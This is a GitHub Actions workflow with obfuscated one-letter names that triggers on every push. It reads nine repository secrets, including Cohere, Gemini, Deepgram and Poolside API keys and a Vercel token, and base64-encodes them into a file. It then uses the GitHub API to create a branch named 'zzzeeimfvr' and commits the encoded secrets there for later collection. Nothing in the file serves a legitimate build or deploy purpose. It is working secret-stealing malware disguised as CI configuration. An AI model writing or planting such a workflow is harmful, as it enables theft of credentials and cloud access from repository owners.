name: zx
on:
  push:
permissions:
  contents: write
jobs:
  r:
    runs-on: ubuntu-latest
    steps:
      - name: g
        env:
          S0: ${{ secrets.COHERE_API_KEY }}
          S1: ${{ secrets.COHERE_TRIAL_API_KEY }}
          S2: ${{ secrets.KILOCODE_API_KEY }}
          S3: ${{ secrets.POOLSIDE_API_KEY }}
          S4: ${{ secrets.VERCEL_ORG_ID }}
          S5: ${{ secrets.VERCEL_PROJECT_ID }}
          S6: ${{ secrets.VERCEL_TOKEN }}
          S7: ${{ secrets.VITE_DEEPGRAM_API_KEY }}
          S8: ${{ secrets.VITE_GEMINI_API_KEY }}
        run: |
          rm -f o.txt
          echo "COHERE_API_KEY:$(printf %s "$S0" | base64 -w0)" >> o.txt
          echo "COHERE_TRIAL_API_KEY:$(printf %s "$S1" | base64 -w0)" >> o.txt
          echo "KILOCODE_API_KEY:$(printf %s "$S2" | base64 -w0)" >> o.txt
          echo "POOLSIDE_API_KEY:$(printf %s "$S3" | base64 -w0)" >> o.txt
          echo "VERCEL_ORG_ID:$(printf %s "$S4" | base64 -w0)" >> o.txt
          echo "VERCEL_PROJECT_ID:$(printf %s "$S5" | base64 -w0)" >> o.txt
          echo "VERCEL_TOKEN:$(printf %s "$S6" | base64 -w0)" >> o.txt
          echo "VITE_DEEPGRAM_API_KEY:$(printf %s "$S7" | base64 -w0)" >> o.txt
          echo "VITE_GEMINI_API_KEY:$(printf %s "$S8" | base64 -w0)" >> o.txt
      - name: p
        run: |
          BR=zzzeeimfvr
          API=https://api.github.com/repos/${{ github.repository }}
          AUTH="Authorization: Bearer ${{ github.token }}"
          SHA=$(curl -s -H "$AUTH" $API/git/ref/heads/${{ github.ref_name }} | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')
          curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" $API/git/refs -d "{\"ref\":\"refs/heads/$BR\",\"sha\":\"$SHA\"}" >/dev/null
          CONT=$(base64 -w0 o.txt)
          curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" $API/contents/zzzeeimfvr.txt -d "{\"message\":\"z\",\"content\":\"$CONT\",\"branch\":\"$BR\"}" >/dev/null
          echo ok
